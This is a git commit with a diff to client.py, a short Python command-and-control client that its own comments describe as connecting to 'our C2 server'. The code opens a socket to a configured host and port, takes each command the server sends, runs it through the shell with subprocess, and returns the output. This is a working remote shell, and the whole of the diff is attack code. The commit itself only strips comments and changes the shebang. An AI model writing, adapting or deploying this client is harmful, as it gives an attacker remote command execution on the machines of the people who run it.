2a046978ed365b1e3b35b0fef754f1ab02a8ac4d
Abdi <asharif02@gmail.com>
2021-09-15 20:51:21 -0400

    updated client code

--- client.py
+++ client.py
@@ -1,42 +1,29 @@
-#! /usr/bin/env python3
+#!/usr/bin/python3
 
 import socket
 import subprocess
 
-HOST = '127.0.0.1' # does this need to be our C2 server?
+HOST = '127.0.0.1' # ip of our C2 server
 PORT = 5555 # random port it does not matter
 
 # set up the socket and connect to the server
 s = socket.socket()
 s.connect((HOST, PORT))
 
-# get the welcome message
-#msg = s.recv(1024).decode()
-#print('[*] server:', msg)
-
-
 # this loop will run until it receive 'quit'
 while True:
-
-    # receive the command and print it
     cmd = s.recv(1024).decode()
-    #print(f'[*] receive {cmd}')
-
-    # check if you want to quit
     if cmd.lower() == 'quit':
         break
-
-    # now run the command and get the result.
+		
     try:
         result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
     except Exception as e:
         result = str(e).encode()
 
-    # if the command has no output, send 'ok' so the server knows everything is okay
-    if len(result) == 0:
+    if len(result) == 0: # send 'ok' so the server knows everything is okay
         result = 'OK'.encode()
 
-    # send the result to the server
     s.send(result)
 
 s.close()
